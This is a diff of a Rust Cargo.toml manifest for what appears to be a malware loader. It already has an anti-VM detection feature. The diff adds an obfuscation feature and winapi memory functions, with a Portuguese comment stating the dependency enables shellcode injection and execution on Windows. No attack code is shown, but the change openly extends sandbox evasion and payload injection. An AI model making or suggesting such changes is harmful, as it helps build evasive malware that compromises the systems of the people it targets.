@@ -6,14 +6,19 @@ edition.workspace = true
 [features]
 default = ["antivm"]
 antivm = ["dep:antivm"]
+obfs = ["dep:uuid"]
 
 [dependencies]
 common = { path = "../common" }
 anyhow.workspace = true
 clap.workspace = true
+uuid = { workspace = true, optional = true }
 serde.workspace = true
 serde_json.workspace = true
 reqwest = { version = "0.12", default-features = false, features = ["blocking", "rustls-tls", "json", "gzip"] }
 
+
 [target.'cfg(windows)'.dependencies]
 antivm = { version = "1.2", optional = true }
+# Adicione esta dependência para permitir a injeção e execução de shellcode no Windows:
+winapi = { version = "0.3", features = ["memoryapi", "errhandlingapi"] }
